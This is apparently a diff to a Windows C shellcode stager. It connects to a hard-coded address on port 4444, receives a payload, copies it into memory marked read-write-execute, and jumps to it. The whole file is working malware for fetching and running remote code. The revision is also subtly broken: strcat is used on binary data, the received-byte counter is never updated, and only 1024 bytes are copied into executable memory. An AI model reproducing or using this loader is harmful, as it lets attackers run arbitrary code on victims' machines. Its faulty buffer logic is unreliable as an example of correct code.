@@ -4,7 +4,8 @@
 
 #define IP_ADDRESS "10.230.229.13"
 #define PORT 4444
-#define BUF_LEN 819200
+#define BUF_LEN 1024
+#define PAYLOAD_SZ 819200
 
 int main() {
   // Create WSADATA Object
@@ -36,33 +37,35 @@ int main() {
   connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );
 
   // Receive data from port;
-  char* data = (char*)calloc(BUF_LEN, sizeof(char));
+  char buf[BUF_LEN] = "";
+  char data[PAYLOAD_SZ] = { 0 };
   int res = 0;
+  int recvd = 0;
 
   printf("Receiving");
   do {
-    res = recv( ConnectSocket, data, 1024, 0 );
+    res = recv( ConnectSocket, buf, BUF_LEN, 0 );
     if (res > 0) {
+      strcat(data, buf);
       printf(".");
     }
     else if (res == 0) {
-      continue;
+      break;
     }
     else {
       break;
     }
   } while (res > 0);
-  printf("Received payload with size of %d.\n", sizeof(data));
-  
+  printf("Received payload with size of %d.\n", recvd);
 
   printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
-  void *rwx_data = VirtualAlloc(NULL, BUF_LEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  memcpy(rwx_data, data, BUF_LEN);
-  //VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, 0);
+  void* rwx = VirtualAlloc(NULL, BUF_LEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  memcpy(rwx, data, BUF_LEN);
+  // VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, 0);
 
   printf("Executing payload.\n");
   // Execute the received payload
-  (*(void(*)()) rwx_data)();
+  (*(void(*)()) rwx)();
 }
 
